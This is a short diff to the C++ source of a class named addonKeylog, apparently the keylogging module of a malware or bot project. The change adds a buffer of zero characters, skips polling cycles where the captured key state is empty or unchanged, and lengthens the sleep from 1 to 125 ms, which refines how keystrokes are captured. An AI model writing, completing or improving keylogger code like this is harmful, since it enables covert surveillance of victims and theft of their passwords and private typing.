@@ -47,6 +47,9 @@ DWORD addonKeylog::Thread(void *lpParam)
 
 	char key[257];
 	char old_key[257];
+	char null_key[257];
+
+	memset(null_key, '0', sizeof null_key);
 
 	do
 	{
@@ -62,9 +65,9 @@ DWORD addonKeylog::Thread(void *lpParam)
 
 		key[256] = NULL;
 
-		if(!strcmp(key, old_key))
+		if(!strcmp(key, null_key) || !strcmp(key, old_key))
 		{
-			Sleep(1);
+			Sleep(125);
 
 			continue;
 		}
